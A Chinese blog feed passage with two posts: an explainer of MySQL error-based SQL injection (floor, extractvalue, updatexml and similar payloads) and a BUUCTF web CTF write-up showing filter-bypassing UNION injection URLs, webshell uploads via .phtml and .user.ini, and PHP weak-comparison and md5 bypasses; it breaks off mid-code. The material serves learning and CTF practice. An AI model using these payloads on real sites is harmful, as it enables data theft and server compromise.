    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前阵子看我以前的文章</p><p><a href="http://www.damyahome.top/%E4%B8%80%E4%BA%9B%E5%92%8Csql%E6%B3%A8%E5%85%A5%E6%9C%89%E5%85%B3%E7%9A%84web%E9%A2%98wp/" target="_blank" rel="noopener">http://www.damyahome.top/%E4%B8%80%E4%BA%9B%E5%92%8Csql%E6%B3%A8%E5%85%A5%E6%9C%89%E5%85%B3%E7%9A%84web%E9%A2%98wp/</a></p><p>有写有十种报错注入的方式,然后觉得自己还没理解透,所以小结梳理一下.</p><p>只分析常用的三种,其他都可以举一反三.</p><h2 id="十种报错注入"><a href="#十种报错注入" class="headerlink" title="十种报错注入"></a>十种报错注入</h2><p>资料来自:</p><p><a href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html" target="_blank" rel="noopener">https://www.cnblogs.com/wocalieshenmegui/p/5917967.html</a></p><ol><li><p>floor()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure></li><li><p>extractvalue()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br></pre></td></tr></table></figure></li><li><p>updatexml()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br></pre></td></tr></table></figure></li><li><p>geometrycollection()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure></li><li><p>multipoint()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure></li><li><p>polygon()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure></li><li><p>multipolygon()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure></li><li><p>linestring()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure></li><li><p>multilinestring()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure></li><li><p>exp()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure></li></ol><p>其中比较常用的是floor(),extractvalue(),updataxml().exp()也遇到过.</p><h2 id="floor报错"><a href="#floor报错" class="headerlink" title="floor报错"></a>floor报错</h2><p>原因主要是因为虚拟表的主键重复。按照MySQL的官方说法，group by要进行两次运算，第一次是拿group by后面的字段值到虚拟表中去对比前，首先获取group by后面的值；第二次是假设group by后面的字段的值在虚拟表中不存在，那就需要把它插入到虚拟表中，这里在插入时会进行第二次运算，由于rand函数存在一定的随机性，所以第二次运算的结果可能与第一次运算的结果不一致，但是这个运算的结果可能在虚拟表中已经存在了，那么这时的插入必然导致主键的重复，进而引发错误，爆出我们实际想查询的数据。</p><h3 id="函数原理"><a href="#函数原理" class="headerlink" title="函数原理"></a>函数原理</h3><p>基本语句(x 表示数字)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),(floor(rand(0)*2))x from table group by x;</span><br></pre></td></tr></table></figure><p>举例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure></p><h4 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h4><p>floor函数的作用是返回小于等于该值的最大整数,也可以理解为向下取整,只保留整数部分.</p><h4 id="rand"><a href="#rand" class="headerlink" title="rand()"></a>rand()</h4><p>rand()和rand(0)是有区别的,rand生成随机的0-1间随机数,结果不确定,而加了0的种子,就会形成伪随机.(产生的数据都是可预知的)当生成的数据和虚拟表数据重合时,就会形成报错.</p><h4 id="floor-rand-0-2"><a href="#floor-rand-0-2" class="headerlink" title="floor(rand(0)*2)"></a>floor(rand(0)*2)</h4><p>将0-1间随机数变成0-2间的随机数,并进行取整,得到01随机数串.</p><h4 id="group-by-与-count"><a href="#group-by-与-count" class="headerlink" title="group by 与 count(*)"></a>group by 与 count(*)</h4><p>group by()对数据进行分组,相同的分为一组,整合重复数据.</p><p>count()对重复数据进行计数.在查询数据的时候,首先查看该虚拟表中是否存在该分组,如果存在那么计数值加1,不存在则新建该分组.</p><figure class="image-box">                <img src="./1.png" alt="图片" title class>                <p>图片</p>            </figure><p>count(*) 将返回表格中所有存在的行的总数包括值为 null 的行,在mysql查询中是最快的方式.</p><h3 id="报错分析"><a href="#报错分析" class="headerlink" title="报错分析"></a>报错分析</h3><h4 id="group-by-的虚拟表"><a href="#group-by-的虚拟表" class="headerlink" title="group by()的虚拟表"></a>group by()的虚拟表</h4><p>在对数据进行查询时,group by会把重复数据整合,生成虚拟表,我们的查询也是在虚拟表上进行查询,避免了重复数据的干扰,并且需要整合函数count()或sum()进行计数.</p><figure class="image-box">                <img src="./2.png" alt="图片" title class>                <p>图片</p>            </figure><h4 id="rand-的特殊性"><a href="#rand-的特殊性" class="headerlink" title="rand()的特殊性"></a>rand()的特殊性</h4><p>根据group by的两次运算,当其进行分组时,调用的floor(rand(0)<em>2)执行一次(查看分组是否存在),如果虚拟表中不存在该分组,那么在插入新分组的时候 floor(rand(0)</em>2) 就又计算了一次.(只要 rand(0) 被调用，一定会产生新值)</p><p>根据之前生成的表进行分析.</p><figure class="image-box">                <img src="./3.png" alt="图片" title class>                <p>图片</p>            </figure><p>当 group by 对其进行分组的时候,首先遇到第一个值 0 ,发现 0 不存在,于是需要插入分组,此时floor(rand(0)<em>2)再次被触发,生成第二个值1,因此最终插入虚拟表的也就是第二个值 1;然后遇到第三个值 1 ,因为已经存在分组 1 了,就直接计数加1(count()这时1的计数变为2);遇到第四个值 0 的时候,发现 0 不存在,于是又需要插入新分组,然后floor(rand(0)</em>2)又被触发,生成第五个值 1 ,因此这时还是往虚拟表里插入分组 1 ,但分组 1 已经存在,所以报错.</p><h2 id="extractvalue报错"><a href="#extractvalue报错" class="headerlink" title="extractvalue报错"></a>extractvalue报错</h2><p>MySQL 5.1.5版本中添加了对XML文档进行查询和修改的两个函数：extractvalue、updatexml</p><p>extractvalue()使用XPath表示法从XML字符串中提取值</p><h3 id="函数原理-1"><a href="#函数原理-1" class="headerlink" title="函数原理"></a>函数原理</h3><p>基本语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select extractvalue(1,concat(0x7e,(select user()),0x7e));</span><br></pre></td></tr></table></figure><p>举例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br></pre></td></tr></table></figure></p><h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><p>ExtractValue(xml_frag, xpath_expr)</p><p>ExtractValue()接受两个字符串参数，一个XML标记片段 xml_frag和一个XPath表达式 xpath_expr（也称为 定位器）; 它返回CDATA第一个文本节点的text（），该节点是XPath表达式匹配的元素的子元素。</p><p>第一个参数可以传入目标xml文档，第二个参数是用Xpath路径法表示的查找路径</p><h4 id="XPath路径表达式"><a href="#XPath路径表达式" class="headerlink" title="XPath路径表达式"></a>XPath路径表达式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nodename　　节点名，选取此节点的所有子节点　　例： childnode　　当前节点中的childnode子节点，不包含孙子及以下的节点</span><br><span class="line">/　　　从根节点选取　　例：/root/childnode/grandsonnode</span><br><span class="line">//　  表示所有后代节点　　例：//childnode　所有名为childnode的后代节点</span><br><span class="line">.　　 表示当前节点　　例：./childnode　    表示当前节点的childnode节点</span><br><span class="line">..　  表示父节点　　例： ../nearnode　　  表示父亲节点的nearnode子节点</span><br><span class="line">@　　 选取属性　　/root/childnode/@id　　表示childnode的所有含有id属性的节点集</span><br></pre></td></tr></table></figure><p>谓语可以对节点集进行一些限制，使选择更精确<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/root/book[1]　　　　节点集中的第一个节点</span><br><span class="line">/root/book[last()]　　节点集中最后一个节点</span><br><span class="line">/root/book[position() - 1]　　节点集中倒数第二个节点集</span><br><span class="line">/root/book[position() &lt; 5]　　节点集中前五个节点集</span><br><span class="line">/root/book[@id]　　　　　　节点集中含有属性id的节点集</span><br><span class="line">/root/book[@id=&apos;chinese&apos;]　　节点集中id属性值为chinese的节点集</span><br><span class="line">/root/book[price &gt; 35]/title　　节点集中book的price元素值大于35的title节点集</span><br></pre></td></tr></table></figure></p><p>通配符<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">XPath路径中同样支持通配符（*，@*，node()， text()）</span><br><span class="line">例：　　/bookstore/*</span><br><span class="line">//title[@*]</span><br></pre></td></tr></table></figure></p><p>运算符<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">|　　两个节点集的合并　　例：/root/book[1] | /root/book[3]</span><br><span class="line">+，-，*，dev，mod</span><br><span class="line">=，!=，&lt;，&gt;，&lt;=，&gt;=</span><br><span class="line">or，and　　或和与</span><br><span class="line">多个属性条件查询　　　　　　//div[@align=&apos;center&apos; and @height=&apos;24&apos;]</span><br><span class="line">不存在class属性　　 　　　　//div[not(@class)]</span><br></pre></td></tr></table></figure></p><h3 id="报错分析-1"><a href="#报错分析-1" class="headerlink" title="报错分析"></a>报错分析</h3><p>报错注入通过报错信息来查到我们想要的内容，首先需要构造的就是报错。</p><p>例如：SELECT ExtractValue(‘<a><b><b></b></b></a>‘, ‘/a/b’); 就是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错，可以利用这个特性来获得我们想要知道的内容。</p><figure class="image-box">                <img src="./4.png" alt="图片" title class>                <p>图片</p>            </figure><p>利用concat()函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。</p><p>concat()函数用于将多个字符串连接成一个字符串，返回结果为连接参数产生的字符串，如有任何一个参数为NULL/二进制 ，则返回值为 NULL/二进制。</p><figure class="image-box">                <img src="./5.png" alt="图片" title class>                <p>图片</p>            </figure><h2 id="updatexml报错"><a href="#updatexml报错" class="headerlink" title="updatexml报错"></a>updatexml报错</h2><p>updatexml()返回替换的XML片段</p><h3 id="函数原理-2"><a href="#函数原理-2" class="headerlink" title="函数原理"></a>函数原理</h3><p>基本语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select updatexml(1,concat(0x7e,(select user()),0x7e),1);</span><br></pre></td></tr></table></figure><p>举例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br></pre></td></tr></table></figure></p><h4 id="updatexml（）"><a href="#updatexml（）" class="headerlink" title="updatexml（）"></a>updatexml（）</h4><p>UpdateXML(xml_target, xpath_expr, new_xml)</p><p>xml_target:： 需要操作的xml片段</p><p>xpath_expr： 需要更新的xml路径(Xpath格式)</p><p>new_xml： 更新后的内容</p><p>此函数用来更新选定XML片段的内容，将XML标记的给定片段的单个部分替换为 xml_target 新的XML片段 new_xml ，然后返回更改的XML。xml_target替换的部分 与xpath_expr 用户提供的XPath表达式匹配。</p><p>如果未xpath_expr找到表达式匹配 ，或者找到多个匹配项，则该函数返回原始 xml_targetXML片段。所有三个参数都应该是字符串。</p><h3 id="报错分析-2"><a href="#报错分析-2" class="headerlink" title="报错分析"></a>报错分析</h3><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select</span><br><span class="line">UpdateXML(&apos;&lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;&apos;, &apos;/a&apos;, &apos;&lt;e&gt;fff&lt;/e&gt;&apos;) AS val1</span><br><span class="line">UpdateXML(&apos;&lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;&apos;, &apos;/b&apos;, &apos;&lt;e&gt;fff&lt;/e&gt;&apos;) AS val2</span><br><span class="line">UpdateXML(&apos;&lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;&apos;, &apos;//b&apos;, &apos;&lt;e&gt;fff&lt;/e&gt;&apos;) AS val3</span><br><span class="line">UpdateXML(&apos;&lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;&apos;, &apos;/a/d&apos;, &apos;&lt;e&gt;fff&lt;/e&gt;&apos;) AS val4</span><br><span class="line">UpdateXML(&apos;&lt;a&gt;&lt;d&gt;&lt;/d&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;&apos;, &apos;/a/d&apos;, &apos;&lt;e&gt;fff&lt;/e&gt;&apos;) AS val5</span><br><span class="line">***********结果**************</span><br><span class="line">val1: &lt;e&gt;fff&lt;/e&gt;</span><br><span class="line">val2: &lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;</span><br><span class="line">val3: &lt;a&gt;&lt;e&gt;fff&lt;/e&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;</span><br><span class="line">val4: &lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;e&gt;fff&lt;/e&gt;&lt;/a&gt;</span><br><span class="line">val5: &lt;a&gt;&lt;d&gt;&lt;/d&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>当Xpath路径语法错误时，就会报错，报错内容含有错误的路径内容<br><figure class="image-box">                <img src="./6.png" alt="图片" title class>                <p>图片</p>            </figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;前阵子看我以前的文章&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.damyahome.top/%E4%B8%80%E4%BA%9B
      
    
    </summary>
    
    
      <category term="web学习" scheme="https://www.damyahome.github.io/categories/web%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="sql注入" scheme="https://www.damyahome.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF web练习3</title>
    <link href="https://www.damyahome.github.io/ctf-writeup-web/ckwd913b9001npwucqcvmiwpn/BUUCTF-web%E7%BB%83%E4%B9%A03/"/>
    <id>https://www.damyahome.github.io/ctf-writeup-web/ckwd913b9001npwucqcvmiwpn/BUUCTF-web%E7%BB%83%E4%B9%A03/</id>
    <published>2020-09-29T09:21:43.000Z</published>
    <updated>2020-09-29T09:33:58.130Z</updated>
    
    <content type="html"><![CDATA[<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p><a href="http://1f4a31f5-7d6f-455f-856c-c24ec63ca11d.node3.buuoj.cn" target="_blank" rel="noopener">http://1f4a31f5-7d6f-455f-856c-c24ec63ca11d.node3.buuoj.cn</a></p><p>单引号报错存在注入</p><figure class="image-box">                <img src="./1.png" alt="图片" title class>                <p>图片</p>            </figure><p>联合查询语句被过滤,尝试双重注入</p><figure class="image-box">                <img src="./2.png" alt="图片" title class>                <p>图片</p>            </figure><p>双重注入有效,继续查询</p><p>经查询大概过滤了 union select where or from,全都双写绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?username=1&apos;+uniunionon+seselectlect+1,2,3--+&amp;password=1</span><br><span class="line">?username=1&apos;+uniunionon+seselectlect+1,database(),3--+&amp;password=1  //geek</span><br><span class="line">?username=1&apos;+uniunionon+seselectlect+1,group_concat(table_name),3+frfromom+infoorrmation_schema.tables+whwhereere+table_schema=&apos;geek&apos;--+&amp;password=1  //b4bsql,geekuser</span><br><span class="line">?username=1&apos;+uniunionon+seselectlect+1,group_concat(column_name),3+frfromom+infoorrmation_schema.columns+whwhereere+table_name=&apos;b4bsql&apos;--+&amp;password=1  //id,username,password</span><br><span class="line">?username=1&apos;+uniunionon+seselectlect+1,group_concat(passwoorrd),3+frfromom+b4bsql--+&amp;password=1</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./3.png" alt="图片" title class>                <p>图片</p>            </figure><p>i_want_to_play_2077,sql_injection_is_so_fun,do_you_know_pornhub,github_is_different_from_pornhub,you_found_flag_so_stop,i_told_you_to_stop,hack_by_cl4y,flag{0bdcc0e4-8b1a-4855-974f-55185878f5aa}</p><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p><a href="http://03a309a6-ef7e-4083-a805-48f967450eec.node3.buuoj.cn" target="_blank" rel="noopener">http://03a309a6-ef7e-4083-a805-48f967450eec.node3.buuoj.cn</a></p><figure class="image-box">                <img src="./4.png" alt="图片" title class>                <p>图片</p>            </figure><p>网页名叫上传头像,估计后缀名是图片,直接传图片马</p><p>过滤了php后缀,大小写,php345等,改成phtml上传成功</p><figure class="image-box">                <img src="./5.png" alt="图片" title class>                <p>图片</p>            </figure><p>添加菜刀,路径是/upload/shell.phtml,在根目录拿到flag</p><figure class="image-box">                <img src="./6.png" alt="图片" title class>                <p>图片</p>            </figure><p>flag{0daae0dc-b56e-468e-9efd-250e2667f1e5}</p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p><a href="http://68e807d3-2827-4ddc-bc75-307ac47059c6.node3.buuoj.cn" target="_blank" rel="noopener">http://68e807d3-2827-4ddc-bc75-307ac47059c6.node3.buuoj.cn</a></p><p>尝试了好多能被php解析的后缀,都提示illegal suffix!</p><p>用图片后缀时提示</p><figure class="image-box">                <img src="./7.png" alt="图片" title class>                <p>图片</p>            </figure><p>看到数组输出,猜测是nginx,考虑上传.user.ini文件,.user.ini会将图片马中的代码包含到每个php文件中,调用时用auto_prepend_file来包含我们的shell.jpg</p><p>在.user.ini里能调用的参数有auto_prepend_file和auto_append_file</p><p>相当于指定一个文件,自动包含在要执行的文件前,类似于在文件前调用了require()函数</p><p>但auto_prepend_file是在文件前插入,而auto_append_file是在文件最后才插入</p><figure class="image-box">                <img src="./8.png" alt="图片" title class>                <p>图片</p>            </figure><p>注意路径,/uploads/04b0951938d905b41348c1548f9c338b/index.php</p><p>上传成功后蚁剑连接</p><figure class="image-box">                <img src="./9.png" alt="图片" title class>                <p>图片</p>            </figure><p>flag{751bca8b-f279-435d-acdf-a0c711380fab}</p><h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p><a href="http://9c479038-922c-4d88-9f02-52d4995a545e.node3.buuoj.cn" target="_blank" rel="noopener">http://9c479038-922c-4d88-9f02-52d4995a545e.node3.buuoj.cn</a></p><p>根据 Try to find out source file! 先查看源码</p><p>fuzz了一下,源码文件是index.php.bak</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">'key'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line"><span class="comment">//检测$key是否为数字或数字字符串</span></span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"Just num!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line"><span class="comment">//获取$key的整数值</span></span><br><span class="line">    $str = <span class="string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line"><span class="comment">//要求$key取整后的值等于$str</span></span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Try to find out source file!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为在 $key == $str 的比较中是弱比较,只需比较字母前的数字,即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?key=123</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="./10.png" alt="图片" title class>                <p>图片</p>            </figure><p>flag{2d41b6bd-3496-40fc-b34c-32c91ca50b67}</p><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p><a href="http://17555bee-794b-4019-9361-b4a76e7a17ab.node3.buuoj.cn" target="_blank" rel="noopener">http://17555bee-794b-4019-9361-b4a76e7a17ab.node3.buuoj.cn</a></p><figure class="image-box">                <img src="./11.png" alt="图片" title class>                <p>图片</p>            </figure><p>传个图片马,改后缀phtml,加GIF98A头</p><figure class="image-box">                <img src="./12.png" alt="图片" title class>                <p>图片</p>            </figure><p>蚁剑连接,拿到根目录下flag</p><figure class="image-box">                <img src="./13.png" alt="图片" title class>                <p>图片</p>            </figure><p>flag{f6d3674b-ccd1-439c-9cd9-a51059d1b5a3}</p><h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p><a href="http://55d23e6e-9121-4338-98f5-b3a7b64c9192.node3.buuoj.cn" target="_blank" rel="noopener">http://55d23e6e-9121-4338-98f5-b3a7b64c9192.node3.buuoj.cn</a></p><figure class="image-box">                <img src="./14.png" alt="图片" title class>                <p>图片</p>            </figure><p>查看pay.php源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">~~~post money <span class="keyword">and</span> password~~~</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span> (is_numeric($password)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"password can't be number&lt;/br&gt;"</span>;</span><br><span class="line">&#125;<span class="keyword">elseif</span> ($password == <span class="number">404</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Password Right!&lt;/br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>post一个password=404,抓个包<br><figure class="image-box">                <img src="./15.png" alt="图片" title class>                <p>图片</p>            </figure></p><p>cookie里有可疑变量,改user=1</p><figure class="image-box">                <img src="./16.png" alt="图片" title class>                <p>图片</p>            </figure><p>因为比较还是 == ,可以弱比较绕过</p><figure class="image-box">                <img src="./17.png" alt="图片" title class>                <p>图片</p>            </figure><p>post一个够买flag的money</p><figure class="image-box">                <img src="./18.png" alt="图片" title class>                <p>图片</p>            </figure><p>直接买会提示字符串太长,可以用科学计数法表示100000000=1e9</p><figure class="image-box">                <img src="./19.png" alt="图片" title class>                <p>图片</p>            </figure><p>flag{ce96bdde-166b-4b5e-84c5-1532f8498f23}</p><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p><a href="http://e71837b5-f32d-44a8-a478-6868f556634d.node3.buuoj.cn" target="_blank" rel="noopener">http://e71837b5-f32d-44a8-a478-6868f556634d.node3.buuoj.cn</a></p><figure class="image-box">                <img src="./20.png" alt="图片" title class>                <p>图片</p>            </figure><p>查看源码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">section</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"upload"</span> <span class="attr">action</span>=<span class="string">"leveldo4.php"</span> <span class="attr">method</span>=<span class="string">"GET"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"name"</span> <span class="attr">name</span>=<span class="string">'password'</span> <span class="attr">class</span>=<span class="string">"in"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"give"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br></pre></td></tr></table></figure><p>因为这题和md5有关,在md5里有一个很有意思的字符串 ffifdyop<br>这个字符串md5后是’or’6�]��!r,��b,正好前几位可以用于闭合查询语句,就可以用来绕过</p><figure class="image-box">                <img src="./21.png" alt="图片" title class>                <p>图片</p>            </figure><p>引入了一个新页面,访问之</p><figure class="image-box">                <img src="./22.png" alt="图片" title class>                <p>图片</p>            </figure><p>查看源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$a = $GET[&apos;a&apos;];</span><br><span class="line">$b = $_GET[&apos;b&apos;];</span><br><span class="line"></span><br><span class="line">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="line">// wow, glzjin wants a girl friend.</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>可以用0e绕过md5弱比较,以下是一些常见的0e字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 